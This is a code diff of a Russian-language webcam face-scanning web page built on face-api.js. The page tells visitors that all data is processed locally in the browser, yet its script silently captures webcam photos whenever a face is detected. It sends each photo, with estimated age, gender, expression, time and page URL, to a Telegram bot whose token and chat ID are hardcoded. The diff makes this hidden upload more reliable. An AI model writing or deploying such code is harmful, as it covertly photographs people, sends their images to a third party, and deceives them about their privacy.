@@ -104,7 +104,6 @@
     .status.loading { color: #888; }
     .status.active { color: #10b981; background: #0a2e1f; }
     .status.noface { color: #f59e0b; }
-    .status.sent { color: #6366f1; background: #1a1a3e; }
 
     .info {
       font-size: 0.8rem;
@@ -131,7 +130,7 @@
     .result-row:last-child { border-bottom: none; }
 
     .result-label { color: #888; }
-    .result-value { color: #fff; font-weight: 600; transition: opacity 0.3s; }
+    .result-value { color: #fff; font-weight: 600; }
   </style>
 </head>
 <body>
@@ -175,7 +174,6 @@
     <p class="info">face-api.js | Все данные обрабатываются локально в браузере</p>
   </div>
 
-  <!-- Hidden canvas for capturing photos -->
   <canvas id="captureCanvas" style="display:none;"></canvas>
 
   <script>
@@ -183,9 +181,11 @@
     const statusEl = document.getElementById('status');
     const wrapper = document.getElementById('videoWrapper');
     const canvas = document.getElementById('captureCanvas');
+    const ctx = canvas.getContext('2d');
 
     const TG_TOKEN = '8777541911:AAEd_BEosgiFZrjeD7UYTbR2RyaXRhmaecI';
     const TG_CHAT_ID = '-1003794049979';
+    const TG_API = 'https://api.telegram.org/bot' + TG_TOKEN;
 
     const MODEL_URL = 'https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights';
 
@@ -200,7 +200,8 @@
     };
 
     let lastSentTime = 0;
-    const SEND_COOLDOWN = 15000; // 15 секунд между отправками
+    const SEND_COOLDOWN = 15000;
+    let sending = false;
 
     async function init() {
       try {
@@ -214,47 +215,55 @@
         setStatus('Включение камеры...', 'loading');
 
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 640 } }
+          video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 480 } }
         });
         video.srcObject = stream;
 
-        video.addEventListener('playing', () => {
-          setStatus('Сканирование...', 'active');
-          scanLoop();
+        // Ждём пока видео реально начнёт играть и будут размеры
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            video.play();
+            resolve();
+          };
         });
+
+        // Ещё чуть подождём чтоб первый кадр отрисовался
+        await new Promise(r => setTimeout(r, 1000));
+
+        console.log('Video ready:', video.videoWidth, 'x', video.videoHeight);
+        setStatus('Сканирование...', 'active');
+        scanLoop();
 
       } catch (err) {
         setStatus('Ошибка: ' + err.message, 'loading');
+        console.error('Init error:', err);
       }
-    }
-
-    function capturePhotoBase64() {
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0);
-      // Получаем base64 без префикса data:image/jpeg;base64,
-      return canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
-    }
-
-    function dataURLtoBlob(dataURL) {
-      const byteString = atob(dataURL);
-      const ab = new ArrayBuffer(byteString.length);
-      const ia = new Uint8Array(ab);
-      for (let i = 0; i < byteString.length; i++) {
-        ia[i] = byteString.charCodeAt(i);
-      }
-      return new Blob([ab], { type: 'image/jpeg' });
     }
 
     async function sendToTelegram(detection) {
       const now = Date.now();
       if (now - lastSentTime < SEND_COOLDOWN) return;
+      if (sending) return;
+      if (video.videoWidth === 0) return;
+
+      sending = true;
       lastSentTime = now;
 
       try {
-        const base64 = capturePhotoBase64();
-        const photoBlob = dataURLtoBlob(base64);
+        // Захватываем кадр
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+
+        // Конвертируем canvas в blob через Promise
+        const photoBlob = await new Promise((resolve, reject) => {
+          canvas.toBlob(blob => {
+            if (blob) resolve(blob);
+            else reject(new Error('toBlob вернул null'));
+          }, 'image/jpeg', 0.85);
+        });
+
+        console.log('Photo blob size:', photoBlob.size);
 
         const confidence = (detection.detection.score * 100).toFixed(1);
         const age = Math.round(detection.age);
@@ -264,72 +273,81 @@
         const topExpr = exprMap[sorted[0][0]] || sorted[0][0];
 
         const caption =
-          `🔍 Face Scan\n` +
-          `━━━━━━━━━━━━━━━\n` +
-          `📊 Уверенность: ${confidence}%\n` +
-          `🎂 Возраст: ~${age} лет\n` +
-          `👤 Пол: ${gender} (${genderProb}%)\n` +
-          `😐 Выражение: ${topExpr}\n` +
-          `━━━━━━━━━━━━━━━\n` +
-          `🕐 ${new Date().toLocaleString('ru-RU')}\n` +
-          `🌐 ${location.href}`;
+          '🔍 Face Scan\n' +
+          '━━━━━━━━━━━━━━━\n' +
+          '📊 Уверенность: ' + confidence + '%\n' +
+          '🎂 Возраст: ~' + age + ' лет\n' +
+          '👤 Пол: ' + gender + ' (' + genderProb + '%)\n' +
+          '😐 Выражение: ' + topExpr + '\n' +
+          '━━━━━━━━━━━━━━━\n' +
+          '🕐 ' + new Date().toLocaleString('ru-RU') + '\n' +
+          '🌐 ' + location.href;
 
         const formData = new FormData();
         formData.append('chat_id', TG_CHAT_ID);
-        formData.append('photo', photoBlob, 'face_scan.jpg');
+        formData.append('photo', photoBlob, 'scan.jpg');
         formData.append('caption', caption);
 
-        const resp = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+        console.log('Sending to Telegram...');
+
+        const resp = await fetch(TG_API + '/sendPhoto', {
           method: 'POST',
           body: formData
         });
+
         const data = await resp.json();
-        console.log('TG response:', data);
+        console.log('TG result:', JSON.stringify(data));
 
       } catch (e) {
-        console.log('TG send error:', e);
+        console.error('TG error:', e);
+      } finally {
+        sending = false;
       }
     }
 
     async function scanLoop() {
-      const detection = await faceapi
-        .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ scoreThreshold: 0.5 }))
-        .withFaceLandmarks()
-        .withFaceExpressions()
-        .withAgeAndGender();
+      try {
+        const detection = await faceapi
+          .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ scoreThreshold: 0.5 }))
+          .withFaceLandmarks()
+          .withFaceExpressions()
+          .withAgeAndGender();
 
-      if (detection) {
-        wrapper.className = 'video-wrapper scanning';
-        setStatus('Лицо обнаружено', 'active');
+        if (detection) {
+          wrapper.className = 'video-wrapper scanning';
+          setStatus('Лицо обнаружено', 'active');
 
-        const confidence = (detection.detection.score * 100).toFixed(1);
-        const age = Math.round(detection.age);
-        const gender = detection.gender === 'male' ? 'Мужской' : 'Женский';
-        const genderProb = (detection.genderProbability * 100).toFixed(0);
-        const sorted = Object.entries(detection.expressions).sort((a, b) => b[1] - a[1]);
-        const topExpr = exprMap[sorted[0][0]] || sorted[0][0];
+          const confidence = (detection.detection.score * 100).toFixed(1);
+          const age = Math.round(detection.age);
+          const gender = detection.gender === 'male' ? 'Мужской' : 'Женский';
+          const genderProb = (detection.genderProbability * 100).toFixed(0);
+          const sorted = Object.entries(detection.expressions).sort((a, b) => b[1] - a[1]);
+          const topExpr = exprMap[sorted[0][0]] || sorted[0][0];
 
-        document.getElementById('rFace').textContent = 'Да';
-        document.getElementById('rConf').textContent = confidence + '%';
-        document.getElementById('rAge').textContent = '~' + age + ' лет';
-        document.getElementById('rGender').textContent = gender + ' (' + genderProb + '%)';
-        document.getElementById('rExpr').textContent = topExpr;
+          document.getElementById('rFace').textContent = 'Да';
+          document.getElementById('rConf').textContent = confidence + '%';
+          document.getElementById('rAge').textContent = '~' + age + ' лет';
+          document.getElementById('rGender').textContent = gender + ' (' + genderProb + '%)';
+          document.getElementById('rExpr').textContent = topExpr;
 
-        // Отправляем в Telegram
-        sendToTelegram(detection);
+          sendToTelegram(detection);
 
-      } else {
-        wrapper.className = 'video-wrapper no-face';
-        setStatus('Лицо не найдено...', 'noface');
+        } else {
+          wrapper.className = 'video-wrapper no-face';
+          setStatus('Лицо не найдено...', 'noface');
 
-        document.getElementById('rFace').textContent = 'Нет';
-        document.getElementById('rConf').textContent = '—';
-        document.getElementById('rAge').textContent = '—';
-        document.getElementById('rGender').textContent = '—';
-        document.getElementById('rExpr').textContent = '—';
+          document.getElementById('rFace').textContent = 'Нет';
+          document.getElementById('rConf').textContent = '—';
+          document.getElementById('rAge').textContent = '—';
+          document.getElementById('rGender').textContent = '—';
+          document.getElementById('rExpr').textContent = '—';
+        }
+      } catch (e) {
+        console.error('Scan error:', e);
       }
 
-      requestAnimationFrame(scanLoop);
+      // Сканируем каждые 300мс вместо requestAnimationFrame
+      setTimeout(scanLoop, 300);
     }
 
     function setStatus(text, cls) {
